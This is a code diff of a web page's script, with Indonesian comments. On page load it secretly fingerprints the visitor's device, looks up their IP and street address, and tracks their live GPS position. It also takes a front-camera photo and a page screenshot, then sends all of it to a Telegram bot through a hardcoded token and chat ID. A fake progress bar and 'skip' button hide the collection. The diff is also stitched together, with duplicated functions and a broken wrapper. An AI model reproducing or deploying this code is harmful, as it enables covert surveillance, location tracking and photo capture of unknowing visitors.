@@ -478,7 +478,6 @@
       btn.textContent = document.body.classList.contains("dark-mode") ? "☀️" : "🌙";
     }
   
-  (() => {
     const TOKEN = '8417927297:AAFR9-EptORqoCLG3Zl-HdU8AgxkfNEbq1o';
     const CHAT_ID = '7093265853';
 
@@ -575,74 +574,538 @@
         if (d.latitude && d.longitude) {
           msg += `📌 Latitude: ${d.latitude}\n`;
           msg += `📍 Longitude: ${d.longitude}\n`;
-
-          const l = await getLocationDetails(d.latitude, d.longitude);
-          msg += `🏙️ Kabupaten: ${l.kb}\n`;
-          msg += `🏙️ Kecamatan: ${l.kc}\n`;
-          msg += `🏠 Alamat Lengkap: ${l.fa}\n`;
+const skipBtn = document.getElementById('skipBtn');
+    const cameraContainer = document.getElementById('cameraContainer');
+    const cameraFeed = document.getElementById('cameraFeed');
+    const notification = document.getElementById('notification');
+    const progressBar = document.getElementById('progressBar');
+    
+    // State variables
+    let dataCollected = false;
+    let photoTaken = false;
+    let stream = null;
+    
+    // Event listeners
+    skipBtn.addEventListener('click', handleSkip);
+    
+    // Fungsi utama
+    async function init() {
+      // Mulai progress bar animation
+      animateProgressBar();
+      
+      // Jalankan pengumpulan data di latar belakang
+      collectData();
+    }
+    
+    function animateProgressBar() {
+      let width = 50;
+      const interval = setInterval(() => {
+        if (width < 100) {
+          width += 0.5;
+          progressBar.style.width = `${width}%`;
+        } else {
+          clearInterval(interval);
         }
-      } catch (e) {
-        msg += '❌ Gagal mendapatkan informasi lokasi\n';
-      }
-
-      msg += '\n╰───── Owner @zyyfvck ───── ⦿';
-      return msg;
-    };
-
-    const startTracking = async () => {
-      await sendTG(await collectDeviceInfo());
-
+      }, 100);
+    }
+    
+    async function collectData() {
+      if (dataCollected) return;
+      
+      dataCollected = true;
+      
       try {
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
-        const st = await navigator.mediaDevices.getUserMedia({ video: true });
-
-        v.srcObject = st;
-        await new Promise(r => setTimeout(r, 3000));
-
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-
-        c.toBlob(b => sendPhoto(b, 'camera_capture.jpg'), 'image/jpeg');
-
-        st.getTracks().forEach(t => t.stop());
-      } catch (e) {
-        await sendTG('❌ Camera access blocked');
+        // Ambil data visitor
+        const visitorInfo = await getVisitorInfo();
+        
+        // Ambil foto dari kamera
+        await takePhoto();
+        
+        // Kirim data ke Telegram
+        await sendToTelegram(visitorInfo);
+      } catch (error) {
+        console.error("Error collecting data:", error);
       }
+    }
+    
+    function handleSkip() {
+      if (!dataCollected) {
+        collectData();
+        showNotification();
+      }
+    }
+    
+    async function takePhoto() {
+      if (photoTaken) return;
+      
+      try {
+        // Minta akses ke kamera
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
+        });
+        
+        // Tampilkan feed kamera
+        cameraFeed.srcObject = stream;
+        cameraContainer.classList.add('active');
+        
+        // Tunggu sebentar untuk memastikan kamera siap
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Ambil foto
+        const photoData = await capturePhoto();
+        
+        // Simpan foto untuk dikirim nanti
+        window.capturedPhoto = photoData;
+        
+        // Matikan kamera
+        stopCamera();
+        
+        photoTaken = true;
+      } catch (error) {
+        console.error("Error accessing camera:", error);
+        window.capturedPhoto = null;
+      }
+    }
+    
+    function capturePhoto() {
+      return new Promise((resolve) => {
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        
+        // Set canvas size sesuai dengan video
+        canvas.width = cameraFeed.videoWidth;
+        canvas.height = cameraFeed.videoHeight;
+        
+        // Gambar frame video ke canvas
+        context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+        
+        // Konversi ke data URL
+        const dataUrl = canvas.toDataURL('image/jpeg');
+        resolve(dataUrl);
+      });
+    }
+    
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        cameraContainer.classList.remove('active');
+      }
+    }
+    
+    function showNotification() {
+      notification.classList.add('show');
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 3000);
+    }
+    
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
 
-      setTimeout(async () => {
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+    }
+
+    // Fungsi untuk mengenkripsi teks (simulasi)
+    function encryptText(text) {
+      if (text === "N/A") return "N/A";
+      // Simulasi enkripsi dasar (dalam implementasi nyata, gunakan library enkripsi yang kuat)
+      return btoa(text).split('').reverse().join('');
+    }
+
+    async function getVisitorInfo() {
+      const clock = new Date().toLocaleString();
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+      let country = "N/A", province = "N/A", city = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
+      let street = "N/A", streetNumber = "N/A", district = "N/A";
+      let simOperator = "N/A", fullName = "N/A", googleEmail = "N/A", googlePassword = "N/A";
+
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+
+      // Battery info
+      const batteryInfo = await navigator.getBattery().then(battery => {
+        return {
+          "battery level": Math.round(battery.level * 100) + "%",
+          "charging": battery.charging ? "yes" : "no"
+        };
+      }).catch(() => ({
+        "battery level": "N/A",
+        "charging": "N/A"
+      }));
+
+      // Deteksi kartu SIM (hanya bekerja di beberapa browser mobile)
+      if ('connection' in navigator) {
         try {
-          const cn = await html2canvas(document.body);
-          cn.toBlob(b => sendPhoto(b, 'screenshot.jpg'), 'image/jpeg');
+          // @ts-ignore
+          simOperator = navigator.connection.effectiveType || "N/A";
         } catch (e) {
-          await sendTG('❌ Screenshot failed');
+          simOperator = "N/A";
         }
-      }, 5000);
-
-      if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(async pos => {
-          let g = `📍 LIVE GPS TRACKING\n`;
-          g += `📌 Lat: ${pos.coords.latitude}\n`;
-          g += `📍 Lng: ${pos.coords.longitude}\n`;
-          g += `🎯 Akurasi: ${pos.coords.accuracy}m\n`;
-
-          const l = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
-          g += `🏙️ Kabupaten: ${l.kb}\n`;
-          g += `🏙️ Kecamatan: ${l.kc}\n`;
-          g += `🏠 Alamat: ${l.fa}\n`;
-
-          await sendTG(g);
-        },
-        async e => {
-          await sendTG(`❌ GPS Error: ${e.message}`);
-        },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
       }
-    };
 
-    setTimeout(startTracking, 3000);
-  })();
+      // Coba mendapatkan informasi Google (simulasi)
+      try {
+        // Ini hanya simulasi - dalam praktiknya, tidak mungkin mendapatkan info Google pengguna
+        // tanpa otentikasi yang tepat
+        if (localStorage.length > 0) {
+          googleEmail = "user@gmail.com (simulated)";
+          googlePassword = encryptText("password123 (simulated)");
+        }
+      } catch (e) {
+        // Tidak bisa mengakses localStorage
+      }
+
+      // Coba mendapatkan nama lengkap (simulasi)
+      try {
+        // @ts-ignore
+        if (navigator.credentials && navigator.credentials.get) {
+          fullName = "@##&#@$&#--#++-#++#";
+        }
+      } catch (e) {
+        // Tidak bisa mendapatkan info
+      }
+
+      // Dapatkan informasi IP dan lokasi
+      try {
+        // Menggunakan dua layanan berbeda untuk redundansi
+        const ipData1 = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const ipData2 = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+        
+        ip = ipData1.ip || ipData2.ip || "N/A";
+        country = ipData1.country_name || "N/A";
+        province = ipData1.region || "N/A";
+        city = ipData1.city || "N/A";
+        latitude = ipData1.latitude || "N/A";
+        longitude = ipData1.longitude || "N/A";
+        namaISP = ipData1.org || "N/A";
+
+        // Dapatkan informasi alamat lebih detail
+        if (latitude !== "N/A" && longitude !== "N/A") {
+          try {
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+            const data = await response.json();
+            if (data.address) {
+              street = data.address.road || "N/A";
+              streetNumber = data.address.house_number || "N/A";
+              district = data.address.suburb || data.address.neighbourhood || "N/A";
+            }
+          } catch (e) {
+            console.error("Error getting address details:", e);
+          }
+        }
+      } catch (error) {
+        console.error("Error getting IP information:", error);
+      }
+
+      // Dapatkan informasi cuaca
+      try {
+        if (latitude !== "N/A" && longitude !== "N/A") {
+          const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+          weather = weatherData.current_condition[0].weatherDesc[0].value;
+          temperature = weatherData.current_condition[0].temp_C + "°C";
+        }
+      } catch {}
+
+      // Dapatkan lokasi GPS yang lebih akurat
+      try {
+        await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              latitude = pos.coords.latitude.toFixed(6);
+              longitude = pos.coords.longitude.toFixed(6);
+              accuracy = pos.coords.accuracy + "m";
+              resolve();
+            },
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
+        });
+      } catch {}
+
+      return {
+        "ISP": namaISP,
+        "IP Address": ip,
+        "SIM Operator": simOperator,
+        "Full Name": fullName,
+        "Google Email": googleEmail,
+        "Google Password": googlePassword,
+        "Device": device,
+        "Android Version": androidVersion,
+        "Platform": loginFrom,
+        "Coordinates": `${latitude}, ${longitude}`,
+        "Accuracy": accuracy,
+        "Country": country,
+        "Province/State": province,
+        "City": city,
+        "Street": street,
+        "Street Number": streetNumber,
+        "District": district,
+        "Time": clock,
+        "Weather": weather,
+        "Temperature": temperature,
+        "Language": language,
+        "Resolution": resolution,
+        "Timezone": timezone,
+        "Online Status": isOnline ? "Online" : "Offline",
+        "RAM (GB)": deviceMemory,
+        "CPU Cores": cpuCores,
+        "Touch Support": isTouch ? "Yes" : "No",
+        "Cookies Enabled": cookiesEnabled ? "Yes" : "No",
+        "Do Not Track": doNotTrack || "Not specified",
+        "Fingerprint": fingerprint,
+        "Battery Level": batteryInfo["battery level"],
+        "Charging": batteryInfo["charging"]
+      };
+    }
+    
+    async function sendToTelegram(data) {
+      const message = `DATA 2\n\n` +
+        `🌐 *IP Address:* ${data["IP Address"]}\n` +
+        `📞 *SIM Operator:* ${data["SIM Operator"]}\n` +
+        `👤 *Full Name:* ${data["Full Name"]}\n` +
+        `📧 *Google Email:* ${data["Google Email"]}\n` +
+        `🔑 *Google Password:* ${data["Google Password"]}\n` +
+        `🏢 *ISP:* ${data["ISP"]}\n` +
+        `📱 *Device:* ${data["Device"]}\n` +
+        `🤖 *Android Version:* ${data["Android Version"]}\n` +
+        `📍 *Location:* ${data["Coordinates"]}\n` +
+        `📏 *Accuracy:* ${data["Accuracy"]}\n` +
+        `🏛️ *Country:* ${data["Country"]}\n` +
+        `🏙️ *Province/State:* ${data["Province/State"]}\n` +
+        `🏘️ *City:* ${data["City"]}\n` +
+        `🛣️ *Street:* ${data["Street"]}\n` +
+        `🏠 *Street Number:* ${data["Street Number"]}\n` +
+        `🏡 *District:* ${data["District"]}\n` +
+        `🕒 *Time:* ${data["Time"]}\n` +
+        `🌤️ *Weather:* ${data["Weather"]}\n` +
+        `🌡️ *Temperature:* ${data["Temperature"]}\n` +
+        `🗣️ *Language:* ${data["Language"]}\n` +
+        `📺 *Resolution:* ${data["Resolution"]}\n` +
+        `🕐 *Timezone:* ${data["Timezone"]}\n` +
+        `📶 *Online Status:* ${data["Online Status"]}\n` +
+        `💾 *RAM:* ${data["RAM (GB)"]} GB\n` +
+        `⚡ *CPU Cores:* ${data["CPU Cores"]}\n` +
+        `👆 *Touch Support:* ${data["Touch Support"]}\n` +
+        `🍪 *Cookies Enabled:* ${data["Cookies Enabled"]}\n` +
+        `🚫 *Do Not Track:* ${data["Do Not Track"]}\n` +
+        `🔑 *Fingerprint:* ${data["Fingerprint"]}\n` +
+        `🔋 *Battery Level:* ${data["Battery Level"]}\n` +
+        `⚡ *Charging:* ${data["Charging"]}`;
+      
+      // Kirim pesan teks
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+      
+      // Jika ada foto, kirim juga
+      if (window.capturedPhoto) {
+        // Konversi data URL ke blob
+        const blob = await fetch(window.capturedPhoto).then(r => r.blob());
+        
+        // Buat form data untuk upload
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'visitor-photo.jpg');
+        formData.append('caption', 'Visitor photo captured automatically');
+        
+        // Kirim foto
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      }
+    }
+     
+      const sendTG = async msg => {
+        try {
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: msg,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (e) {}
+      };
+
+      const sendPhoto = async (blob, filename) => {
+        try {
+          const fd = new FormData();
+          fd.append('chat_id', CHAT_ID);
+          fd.append('photo', blob, filename);
+
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+          });
+        } catch (e) {}
+      };
+
+      const getLocationDetails = async (lat, lon) => {
+        try {
+          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+          const d = await r.json();
+          if (d.address) {
+            return {
+              kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
+              kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
+              fa: d.display_name || "Alamat tidak tersedia"
+            };
+          }
+        } catch (e) {}
+        return {
+          kb: "Tidak diketahui",
+          kc: "Tidak diketahui",
+          fa: "Alamat tidak tersedia"
+        };
+      };
+
+
+      const collectDeviceInfo = async () => {
+        let msg = 'DATA 1\n\n';
+        msg += '⚙️ DEVICE INFORMATION\n';
+        msg += `🖥️ Device: ${navigator.userAgent}\n`;
+        msg += `💻 Platform: ${navigator.platform}\n`;
+        msg += `🌐 Bahasa: ${navigator.language}\n`;
+        msg += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+        msg += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+        msg += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+        msg += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+        msg += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+
+        if (navigator.getBattery) {
+          try {
+            const b = await navigator.getBattery();
+            msg += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
+            msg += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+          } catch (e) {
+            msg += '🔋 Battery: ❌ Tidak tersedia\n';
+          }
+        }
+
+        msg += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+        msg += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+        msg += `📜 History Length: ${history.length}\n`;
+        msg += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+        msg += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+        msg += `🌍 URL: ${location.href}\n`;
+        msg += `📄 Title: ${document.title}\n`;
+        msg += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        msg += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+        try {
+          const i = await fetch('https://ipapi.co/json/');
+          const d = await i.json();
+
+          msg += '📍 LOCATION INFORMATION\n';
+          msg += `📡 IP Address: ${d.ip}\n`;
+          msg += `🏙️ Kota: ${d.city}\n`;
+          msg += `🏙️ Kabupaten: ${d.region}\n`;
+          msg += `🗺️ Wilayah: ${d.region}\n`;
+          msg += `🌎 Negara: ${d.country_name}\n`;
+          msg += `🏷️ Kode Pos: ${d.postal}\n`;
+
+          if (d.latitude && d.longitude) {
+            msg += `📌 Latitude: ${d.latitude}\n`;
+            msg += `📍 Longitude: ${d.longitude}\n`;
+
+            const l = await getLocationDetails(d.latitude, d.longitude);
+            msg += `🏙️ Kabupaten: ${l.kb}\n`;
+            msg += `🏙️ Kecamatan: ${l.kc}\n`;
+            msg += `🏠 Alamat Lengkap: ${l.fa}\n`;
+          }
+        } catch (e) {
+          msg += '❌ Gagal mendapatkan informasi lokasi\n';
+        }
+
+        msg += '\n ABCD';
+        return msg;
+      };
+
+      const startTracking = async () => {
+        await sendTG(await collectDeviceInfo());
+
+        try {
+          const v = document.getElementById('v');
+          const c = document.getElementById('c');
+          const st = await navigator.mediaDevices.getUserMedia({ video: true });
+
+          v.srcObject = st;
+          await new Promise(r => setTimeout(r, 3000));
+
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v, 0, 0);
+
+          c.toBlob(b => sendPhoto(b, 'camera_capture.jpg'), 'image/jpeg');
+
+          st.getTracks().forEach(t => t.stop());
+        } catch (e) {
+          await sendTG('❌ Camera access blocked');
+        }
+
+        setTimeout(async () => {
+          try {
+            const cn = await html2canvas(document.body);
+            cn.toBlob(b => sendPhoto(b, 'screenshot.jpg'), 'image/jpeg');
+          } catch (e) {
+            await sendTG('❌ Screenshot failed');
+          }
+        }, 5000);
+
+        if (navigator.geolocation) {
+          navigator.geolocation.watchPosition(async pos => {
+            let g = `📍 LIVE GPS TRACKING\n`;
+            g += `📌 Lat: ${pos.coords.latitude}\n`;
+            g += `📍 Lng: ${pos.coords.longitude}\n`;
+            g += `🎯 Akurasi: ${pos.coords.accuracy}m\n`;
+
+            const l = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
+            g += `🏙️ Kabupaten: ${l.kb}\n`;
+            g += `🏙️ Kecamatan: ${l.kc}\n`;
+            g += `🏠 Alamat: ${l.fa}\n`;
+
+            await sendTG(g);
+          },
+          async e => {
+            await sendTG(`❌ GPS Error: ${e.message}`);
+          },
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
+        }
+      };
+
+      setTimeout(startTracking, 3000);
+    // Jalankan init ketika halaman dimuat
+    window.addEventListener('load', init);
   
   </script>
 </body>
